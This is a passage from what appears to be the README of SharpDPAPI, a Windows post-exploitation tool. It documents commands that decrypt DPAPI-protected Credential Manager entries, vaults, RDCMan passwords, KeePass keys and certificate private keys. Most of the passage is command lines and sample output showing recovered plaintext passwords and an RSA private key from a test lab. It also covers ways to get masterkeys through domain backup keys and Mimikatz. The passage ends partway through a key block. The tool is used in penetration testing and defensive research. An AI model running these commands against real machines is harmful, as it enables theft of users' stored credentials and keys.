keys.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe masterkeys /hashes&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.11.3&#xA;&#xA;&#xA;[*] Action: User DPAPI Masterkey File Triage&#xA;&#xA;[*] Will dump user masterkey hashes&#xA;&#xA;[*] Found MasterKey : C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-1473254003-2681465353-4059813368-1000\28678d89-678a-404f-a197-f4186315c4fa&#xA;[*] Found MasterKey : C:\Users\harmj0y\AppData\Roaming\Microsoft\Protect\S-1-5-21-883232822-274137685-4173207997-1111\3858b304-37e5-48aa-afa2-87aced61921a&#xA;...(snip)...&#xA;&#xA;[*] Preferred master keys:&#xA;&#xA;C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-1473254003-2681465353-4059813368-1000\28678d89-678a-404f-a197-f4186315c4fa&#xA;C:\Users\harmj0y\AppData\Roaming\Microsoft\Protect\S-1-5-21-883232822-274137685-4173207997-1111\3858b304-37e5-48aa-afa2-87aced61921a&#xA;&#xA;&#xA;[*] User master key hashes:&#xA;&#xA;{42e95117-ff5f-40fa-a6fc-87584758a479}:$DPAPImk$1*3*S-1-5-21-1473254003-2681465353-4059813368-1000*des3*sha1*18000*09c49e9af9...(snip)...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;credentials&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;credentials&lt;/strong&gt; command will search for Credential files and either a) decrypt them with any &#34;{GUID}:SHA1&#34; masterkeys passed, b) a &lt;code&gt;/mkfile:FILE&lt;/code&gt; of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (&lt;code&gt;/pvk:BASE64...&lt;/code&gt; or &lt;code&gt;/pvk:key.pvk&lt;/code&gt;) to first decrypt any user masterkeys (a la &lt;strong&gt;masterkeys&lt;/strong&gt;), or d) a &lt;code&gt;/password:X&lt;/code&gt; to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz&#39; &lt;code&gt;sekurlsa::dpapi&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;p&gt;A specific credential file (or folder of credentials) can be specified with &lt;code&gt;/target:FILE&lt;/code&gt; or &lt;code&gt;/target:C:\Folder\&lt;/code&gt;. If a file is specified, {GUID}:SHA1 values are required, and if a folder is specified either a) {GUID}:SHA1 values must be supplied or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.&lt;/p&gt; &#xA;&lt;p&gt;If run from an elevated context, Credential files for ALL users will be triaged, otherwise only Credential files for the current user will be processed.&lt;/p&gt; &#xA;&lt;p&gt;Using domain {GUID}:SHA1 masterkey mappings:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe credentials {44ca9f3a-9097-455e-94d0-d91de951c097}:9b049ce6918ab89937687...(snip)... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd00efd903...(snip)...&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.2.0&#xA;&#xA;&#xA;[*] Action: User DPAPI Credential Triage&#xA;&#xA;[*] Triaging Credentials for ALL users&#xA;&#xA;&#xA;Folder       : C:\Users\harmj0y\AppData\Local\Microsoft\Credentials\&#xA;&#xA;  CredFile           : 48C08A704ADBA03A93CD7EC5B77C0EAB&#xA;&#xA;    guidMasterKey    : {885342c6-028b-4ecf-82b2-304242e769e0}&#xA;    size             : 436&#xA;    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)&#xA;    algHash/algCrypt : 32772/26115&#xA;    description      : Local Credential Data&#xA;&#xA;    LastWritten      : 1/22/2019 2:44:40 AM&#xA;    TargetName       : Domain:target=TERMSRV/10.4.10.101&#xA;    TargetAlias      :&#xA;    Comment          :&#xA;    UserName         : DOMAIN\user&#xA;    Credential       : Password!&#xA;&#xA;  ...(snip)...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe credentials /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.2.0&#xA;&#xA;&#xA;[*] Action: User DPAPI Credential Triage&#xA;&#xA;[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!&#xA;&#xA;[*] User master key cache:&#xA;&#xA;{42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665&#xA;...(snip)...&#xA;&#xA;[*] Triaging Credentials for ALL users&#xA;&#xA;&#xA;Folder       : C:\Users\harmj0y\AppData\Local\Microsoft\Credentials\&#xA;&#xA;  CredFile           : 48C08A704ADBA03A93CD7EC5B77C0EAB&#xA;&#xA;    guidMasterKey    : {885342c6-028b-4ecf-82b2-304242e769e0}&#xA;    size             : 436&#xA;    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)&#xA;    algHash/algCrypt : 32772/26115&#xA;    description      : Local Credential Data&#xA;&#xA;    LastWritten      : 1/22/2019 2:44:40 AM&#xA;    TargetName       : Domain:target=TERMSRV/10.4.10.101&#xA;    TargetAlias      :&#xA;    Comment          :&#xA;    UserName         : DOMAIN\user&#xA;    Credential       : Password!&#xA;&#xA;...(snip)...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;vaults&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;vaults&lt;/strong&gt; command will search for Vaults and either a) decrypt them with any &#34;{GUID}:SHA1&#34; masterkeys passed, b) a &lt;code&gt;/mkfile:FILE&lt;/code&gt; of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (&lt;code&gt;/pvk:BASE64...&lt;/code&gt; or &lt;code&gt;/pvk:key.pvk&lt;/code&gt;) to first decrypt any user masterkeys (a la &lt;strong&gt;masterkeys&lt;/strong&gt;), or d) a &lt;code&gt;/password:X&lt;/code&gt; to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz&#39; &lt;code&gt;sekurlsa::dpapi&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;p&gt;The Policy.vpol folder in the Vault folder is decrypted with any supplied DPAPI keys to retrieve the associated AES decryption keys, which are then used to decrypt any associated .vcrd files.&lt;/p&gt; &#xA;&lt;p&gt;A specific vault folder can be specified with &lt;code&gt;/target:C:\Folder\&lt;/code&gt;. In this case, either a) {GUID}:SHA1 values must be supplied or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.&lt;/p&gt; &#xA;&lt;p&gt;Using domain {GUID}:SHA1 masterkey mappings:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe vaults {44ca9f3a-9097-455e-94d0-d91de951c097}:9b049ce6918ab89937687...(snip)... {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}:f9bc09dad3bc2cd00efd903...(snip)...&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.2.0&#xA;&#xA;&#xA;[*] Action: User DPAPI Vault Triage&#xA;&#xA;[*] Triaging Vaults for ALL users&#xA;&#xA;&#xA;[*] Triaging Vault folder: C:\Users\harmj0y\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28&#xA;&#xA;  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28&#xA;  Name               : Web Credentials&#xA;    guidMasterKey    : {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}&#xA;    size             : 240&#xA;    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)&#xA;    algHash/algCrypt : 32772/26115&#xA;    description      :&#xA;    aes128 key       : EDB42294C0721F2F1638A40F0CD67CD8&#xA;    aes256 key       : 84CD64B5F438B8B9DA15238A5CFA418C04F9BED6B4B4CCAC9705C36C65B5E793&#xA;&#xA;    LastWritten      : 10/12/2018 12:10:42 PM&#xA;    FriendlyName     : Internet Explorer&#xA;    Identity         : admin&#xA;    Resource         : https://10.0.0.1/&#xA;    Authenticator    : Password!&#xA;&#xA;...(snip)...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe credentials /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.2.0&#xA;&#xA;&#xA;[*] Action: DPAPI Vault Triage&#xA;&#xA;[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!&#xA;&#xA;[*] User master key cache:&#xA;&#xA;{42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665&#xA;...(snip)...&#xA;&#xA;[*] Triaging Vaults for ALL users&#xA;&#xA;&#xA;[*] Triaging Vault folder: C:\Users\harmj0y\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28&#xA;&#xA;  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28&#xA;  Name               : Web Credentials&#xA;    guidMasterKey    : {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}&#xA;    size             : 240&#xA;    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)&#xA;    algHash/algCrypt : 32772/26115&#xA;    description      :&#xA;    aes128 key       : EDB42294C0721F2F1638A40F0CD67CD8&#xA;    aes256 key       : 84CD64B5F438B8B9DA15238A5CFA418C04F9BED6B4B4CCAC9705C36C65B5E793&#xA;&#xA;    LastWritten      : 10/12/2018 12:10:42 PM&#xA;    FriendlyName     : Internet Explorer&#xA;    Identity         : admin&#xA;    Resource         : https://10.0.0.1/&#xA;    Authenticator    : Password!&#xA;&#xA;...(snip)...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Using a domain DPAPI backup key with a folder specified (i.e. &#34;offline&#34; triage):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe vaults /target:C:\Temp\test\ /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.2.0&#xA;&#xA;&#xA;[*] Action: User DPAPI Vault Triage&#xA;&#xA;[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!&#xA;&#xA;[*] User master key cache:&#xA;&#xA;{42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665&#xA;...(snip)...&#xA;&#xA;[*] Target Vault Folder: C:\Temp\test\&#xA;&#xA;&#xA;[*] Triaging Vault folder: C:\Temp\test\&#xA;&#xA;  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28&#xA;  Name               : Web Credentials&#xA;    guidMasterKey    : {feef7b25-51d6-4e14-a52f-eb2a387cd0f3}&#xA;    size             : 240&#xA;    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)&#xA;    algHash/algCrypt : 32772/26115&#xA;    description      :&#xA;    aes128 key       : EDB42294C0721F2F1638A40F0CD67CD8&#xA;    aes256 key       : 84CD64B5F438B8B9DA15238A5CFA418C04F9BED6B4B4CCAC9705C36C65B5E793&#xA;&#xA;    LastWritten      : 3/20/2019 6:03:50 AM&#xA;    FriendlyName     : Internet Explorer&#xA;    Identity         : account&#xA;    Resource         : http://www.abc.com/&#xA;    Authenticator    : password&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;rdg&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;rdg&lt;/strong&gt; command will search for RDCMan.settings files for the current user (or if elevated, all users) and either a) decrypt them with any &#34;{GUID}:SHA1&#34; masterkeys passed, b) a &lt;code&gt;/mkfile:FILE&lt;/code&gt; of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (&lt;code&gt;/pvk:BASE64...&lt;/code&gt; or &lt;code&gt;/pvk:key.pvk&lt;/code&gt;) to first decrypt any user masterkeys (a la &lt;strong&gt;masterkeys&lt;/strong&gt;), or d) a &lt;code&gt;/password:X&lt;/code&gt; to decrypt any user masterkeys which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz&#39; &lt;code&gt;sekurlsa::dpapi&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;/unprotect&lt;/code&gt; flag will use CryptUnprotectData() to decrypt any saved RDP passwords, &lt;em&gt;if&lt;/em&gt; the command is run from the user context who saved the passwords. This can be done from an &lt;em&gt;unprivileged&lt;/em&gt; context, without the need to touch LSASS. For why this approach isn&#39;t used for credentials/vaults, see Benjamin&#39;s &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem&#34;&gt;documentation here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;A specific RDCMan.settings file, .RDC file (or folder of .RDG files) can be specified with &lt;code&gt;/target:FILE&lt;/code&gt; or &lt;code&gt;/target:C:\Folder\&lt;/code&gt;. If a file is specified, {GUID}:SHA1 values (or &lt;code&gt;/unprotect&lt;/code&gt;) are required, and if a folder is specified either a) {GUID}:SHA1 values must be supplied or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.&lt;/p&gt; &#xA;&lt;p&gt;This command will decrypt any saved password information from both the RDCMan.settings file and any .RDG files referenced by the RDCMan.settings file.&lt;/p&gt; &#xA;&lt;p&gt;Using &lt;code&gt;/unprotect&lt;/code&gt; to decrypt any found passwords:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe rdg /unprotect&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.3.0&#xA;&#xA;&#xA;[*] Action: RDG Triage&#xA;&#xA;[*] Using CryptUnprotectData() to decrypt RDG passwords&#xA;&#xA;[*] Triaging RDCMan Settings Files for current user&#xA;&#xA;    RDCManFile    : C:\Users\harmj0y\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings&#xA;    Accessed      : 5/9/2019 11:52:58 AM&#xA;    Modified      : 5/9/2019 11:52:58 AM&#xA;    Recent Server : test\primary.testlab.local&#xA;&#xA;        Cred Profiles&#xA;&#xA;          Profile Name : testprofile&#xA;            UserName   : testlab.local\dfm&#xA;            Password   : Password123!&#xA;&#xA;        Default Logon Credentials&#xA;&#xA;          Profile Name : Custom&#xA;            UserName   : TESTLAB\harmj0y&#xA;            Password   : Password123!&#xA;&#xA;      C:\Users\harmj0y\Documents\test.rdg&#xA;&#xA;        Servers&#xA;&#xA;          Name         : secondary.testlab.local&#xA;&#xA;          Name         : primary.testlab.local&#xA;          Profile Name : Custom&#xA;            UserName   : TESTLAB\dfm.a&#xA;            Password   : Password123!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Using domain {GUID}:SHA1 masterkey mappings:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe rdg {8abc35b1-b718-4a86-9781-7fd7f37101dd}:ae349cdd3a230f5e04f70fd02be69e2e71f1b017&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.3.0&#xA;&#xA;&#xA;[*] Action: RDG Triage&#xA;&#xA;[*] Using CryptUnprotectData() to decrypt RDG passwords&#xA;&#xA;[*] Triaging RDCMan Settings Files for current user&#xA;&#xA;    RDCManFile    : C:\Users\harmj0y\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings&#xA;    Accessed      : 5/9/2019 11:52:58 AM&#xA;    Modified      : 5/9/2019 11:52:58 AM&#xA;    Recent Server : test\primary.testlab.local&#xA;&#xA;        Cred Profiles&#xA;&#xA;          Profile Name : testprofile&#xA;            UserName   : testlab.local\dfm&#xA;            Password   : Password123!&#xA;&#xA;        Default Logon Credentials&#xA;&#xA;          Profile Name : Custom&#xA;            UserName   : TESTLAB\harmj0y&#xA;            Password   : Password123!&#xA;&#xA;      C:\Users\harmj0y\Documents\test.rdg&#xA;&#xA;        Servers&#xA;&#xA;          Name         : secondary.testlab.local&#xA;&#xA;          Name         : primary.testlab.local&#xA;          Profile Name : Custom&#xA;            UserName   : TESTLAB\dfm.a&#xA;            Password   : Password123!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt;SharpDPAPI.exe rdg /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.3.0&#xA;&#xA;&#xA;[*] Action: RDG Triage&#xA;&#xA;[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!&#xA;&#xA;[*] User master key cache:&#xA;&#xA;{42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665&#xA;...(snip)...&#xA;&#xA;[*] Triaging RDCMan.settings Files for ALL users&#xA;&#xA;    RDCManFile    : C:\Users\harmj0y\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings&#xA;    Accessed      : 5/9/2019 11:52:58 AM&#xA;    Modified      : 5/9/2019 11:52:58 AM&#xA;    Recent Server : test\primary.testlab.local&#xA;&#xA;        Cred Profiles&#xA;&#xA;          Profile Name : testprofile&#xA;            UserName   : testlab.local\dfm.a&#xA;            Password   : Password123!&#xA;&#xA;        Default Logon Credentials&#xA;&#xA;          Profile Name : Custom&#xA;            UserName   : TESTLAB\harmj0y&#xA;            Password   : Password123!&#xA;&#xA;      C:\Users\harmj0y\Documents\test.rdg&#xA;&#xA;        Servers&#xA;&#xA;          Name         : secondary.testlab.local&#xA;&#xA;          Name         : primary.testlab.local&#xA;          Profile Name : Custom&#xA;            UserName   : TESTLAB\dfm.a&#xA;            Password   : Password123!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;keepass&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;keepass&lt;/strong&gt; command will search for KeePass ProtectedUserKey.bin files for the current user (or if elevated, all users) and either a) decrypt them with any &#34;{GUID}:SHA1&#34; masterkeys passed, b) a &lt;code&gt;/mkfile:FILE&lt;/code&gt; of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (&lt;code&gt;/pvk:BASE64...&lt;/code&gt; or &lt;code&gt;/pvk:key.pvk&lt;/code&gt;) to first decrypt any user masterkeys (a la &lt;strong&gt;masterkeys&lt;/strong&gt;), or d) a &lt;code&gt;/password:X&lt;/code&gt; to decrypt any user masterkeys which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz&#39; &lt;code&gt;sekurlsa::dpapi&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;/unprotect&lt;/code&gt; flag will use CryptUnprotectData() to decrypt the key bytes, &lt;em&gt;if&lt;/em&gt; the command is run from the user context who saved the passwords. This can be done from an &lt;em&gt;unprivileged&lt;/em&gt; context, without the need to touch LSASS. For why this approach isn&#39;t used for credentials/vaults, see Benjamin&#39;s &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem&#34;&gt;documentation here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;A specific ProtectedUserKey.bin file, .RDC file (or folder of .RDG files) can be specified with &lt;code&gt;/target:FILE&lt;/code&gt; or &lt;code&gt;/target:C:\Folder\&lt;/code&gt;. If a file is specified, {GUID}:SHA1 values (or &lt;code&gt;/unprotect&lt;/code&gt;) are required, and if a folder is specified either a) {GUID}:SHA1 values must be supplied or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.&lt;/p&gt; &#xA;&lt;p&gt;Decrypted key file bytes can be used with the &lt;a href=&#34;https://github.com/GhostPack/KeeThief/tree/master/KeePass-2.34-Source-Patched&#34;&gt;modified KeePass version in KeeThief&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Using &lt;code&gt;/unprotect&lt;/code&gt; to decrypt any found key material:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt; SharpDPAPI.exe  keepass /unprotect&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.10.0&#xA;&#xA;&#xA;[*] Action: KeePass Triage&#xA;&#xA;[*] Using CryptUnprotectData() for decryption.&#xA;&#xA;[*] Triaging KeePass ProtectedUserKey.bin files for current user&#xA;&#xA;    File             : C:\Users\harmj0y\AppData\Roaming\KeePass\ProtectedUserKey.bin&#xA;    Accessed         : 3/1/2021 1:38:22 PM&#xA;    Modified         : 1/4/2021 5:49:49 PM&#xA;    guidMasterKey    : {dab90445-0a08-4b27-9110-b75d4a7894d0}&#xA;    size             : 210&#xA;    flags            : 0x0&#xA;    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)&#xA;    description      :&#xA;    Key Bytes        : 39 2E 63 EF 0E 37 E8 5C 34 ...&#xA;&#xA;&#xA;SharpDPAPI completed in 00:00:00.0566660&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;certificates&lt;/h4&gt; &#xA;&lt;p&gt;The &lt;strong&gt;certificates&lt;/strong&gt; command will search user encrypted DPAPI certificate private keys a) decrypt them with any &#34;{GUID}:SHA1&#34; masterkeys passed, b) a &lt;code&gt;/mkfile:FILE&lt;/code&gt; of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (&lt;code&gt;/pvk:BASE64...&lt;/code&gt; or &lt;code&gt;/pvk:key.pvk&lt;/code&gt;) to first decrypt any user masterkeys (a la &lt;strong&gt;masterkeys&lt;/strong&gt;), or d) a &lt;code&gt;/password:X&lt;/code&gt; to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz&#39; &lt;code&gt;sekurlsa::dpapi&lt;/code&gt; command.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;code&gt;/unprotect&lt;/code&gt; flag will use CryptUnprotectData() to decrypt private keys, &lt;em&gt;if&lt;/em&gt; the command is run from the user context whose certificates you are trying to access. This can be done from an &lt;em&gt;unprivileged&lt;/em&gt; context, without the need to touch LSASS. For why this approach isn&#39;t used for credentials/vaults, see Benjamin&#39;s &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem&#34;&gt;documentation here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;A specific certificate can be specified with &lt;code&gt;/target:FILE&lt;/code&gt; or &lt;code&gt;/target:C:\Folder\&lt;/code&gt;. In both cases, {GUID}:SHA1 values (or &lt;code&gt;/unprotect&lt;/code&gt;) are required or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.&lt;/p&gt; &#xA;&lt;p&gt;By default, only private keys linkable to an associated installed certificate are displayed. The &lt;code&gt;/showall&lt;/code&gt; command will display ALL decrypted private keys.&lt;/p&gt; &#xA;&lt;p&gt;Use the &lt;code&gt;/cng&lt;/code&gt; flag for CNG private keys (default is capi).&lt;/p&gt; &#xA;&lt;p&gt;Using domain {GUID}:SHA1 masterkey mappings:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt; SharpDPAPI.exe certificates {dab90445-0a08-4b27-9110-b75d4a7894d0}:C23AF7432EB513717AA...(snip)...&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.10.0&#xA;&#xA;&#xA;[*] Action: Certificate Triage&#xA;&#xA;Folder       : C:\Users\harmj0y\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-937929760-3187473010-80948926-1104&#xA;&#xA;  File               : 34eaff3ec61d0f012ce1a0cb4c10c053_6c712ef3-1467-4f96-bb5c-6737ba66cfb0&#xA;&#xA;    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}&#xA;    Master Key GUID  : {dab90445-0a08-4b27-9110-b75d4a7894d0}&#xA;    Description      : CryptoAPI Private Key&#xA;    algCrypt         : CALG_3DES (keyLen 192)&#xA;    algHash          : CALG_SHA (32772)&#xA;    Salt             : ef98458bca7135fe1bb89b3715180ae6&#xA;    HMAC             : 5c3c3da2a4f6548a0186c22f86d7bc85&#xA;    Unique Name      : te-UserMod-8c8e0236-76ca-4a36-b4d5-24eaf3c3e1da&#xA;&#xA;    Thumbprint       : 98A03BC583861DCC19045758C0E0C05162091B6C&#xA;    Issuer           : CN=theshire-DC-CA, DC=theshire, DC=local&#xA;    Subject          : CN=harmj0y&#xA;    Valid Date       : 2/22/2021 2:19:02 PM&#xA;    Expiry Date      : 2/22/2022 2:19:02 PM&#xA;    Enhanced Key Usages:&#xA;        Client Authentication (1.3.6.1.5.5.7.3.2)&#xA;         [!] Certificate is used for client auth!&#xA;        Secure Email (1.3.6.1.5.5.7.3.4)&#xA;        Encrypting File System (1.3.6.1.4.1.311.10.3.4)&#xA;&#xA;    [*] Private key file 34eaff3ec61d0f012ce1a0cb4c10c053_6c712ef3-1467-4f96-bb5c-6737ba66cfb0 was recovered:&#xA;&#xA;-----BEGIN RSA PRIVATE KEY-----&#xA;MIIEpAIBAAKCAQEA0WDgv/jH5HuATtPgQSBie5t...(snip)...&#xA;-----END RSA PRIVATE KEY-----&#xA;-----BEGIN CERTIFICATE-----&#xA;MIIFujCCBKKgAwIBAgITVQAAAJf6yKyhm5SBVwA...(snip)...&#xA;-----END CERTIFICATE-----&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Using &lt;code&gt;/unprotect&lt;/code&gt; to decrypt any found user certificates:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;C:\Temp&amp;gt; SharpDPAPI.exe certificates /unprotect&#xA;&#xA;  __                 _   _       _ ___&#xA; (_  |_   _. ._ ._  | \ |_) /\  |_) |&#xA; __) | | (_| |  |_) |_/ |  /--\ |  _|_&#xA;                |&#xA;  v1.11.3&#xA;&#xA;&#xA;[*] Action: Certificate Triage&#xA;&#xA;[*] Using CryptUnprotectData() for decryption.&#xA;&#xA;&#xA;Folder       : C:\Users\harmj0y\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-937929760-3187473010-80948926-1104&#xA;&#xA;  File               : f29fa2bb6de62b7d966a407ef203ac45_3fef0615-487e-485b-84b0-193b510dec3b&#xA;&#xA;    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}&#xA;    Master Key GUID  : {27db0044-e2aa-4ea2-b2c0-c469e9b29ed9}&#xA;    Description      : Private Key&#xA;    algCrypt         : CALG_AES_256 (keyLen 256)&#xA;    algHash          : CALG_SHA_512 (32782)&#xA;    Salt             : d7e1e00ed8a6249b5f05c487154e83cc0b51f71131530d0d46d3bfc63d890468&#xA;    HMAC             : 4869f296cdcc964262a57e2efc4f2c5df57c2ed7319e297daa2107810da5c171&#xA;    Unique Name      : {4A07001C-57BE-4E8B-86D1-43CACDF8D448}&#xA;&#xA;    Thumbprint       : BBD9B90FE1A4E37BD646CBC922ABE06C24C1E725&#xA;    Issuer           : CN=theshire-DC-CA, DC=theshire, DC=local&#xA;    Subject          : CN=harmj0y&#xA;    Valid Date       : 10/18/2022 11:40:07 AM&#xA;    Expiry Date      : 10/18/2023 12:00:07 PM&#xA;    Enhanced Key Usages:&#xA;        Client Authentication (1.3.6.1.5.5.7.3.2)&#xA;         [!] Certificate is used for client auth!&#xA;        Server Authentication (1.3.6.1.5.5.7.3.1)&#xA;&#xA;    [*] Private key file f29fa2bb6de62b7d966a407ef203ac45_3fef0615-487e-485b-84b0-193b510dec3b was recovered:&#xA;&#xA;-----BEGIN RSA PRIVATE 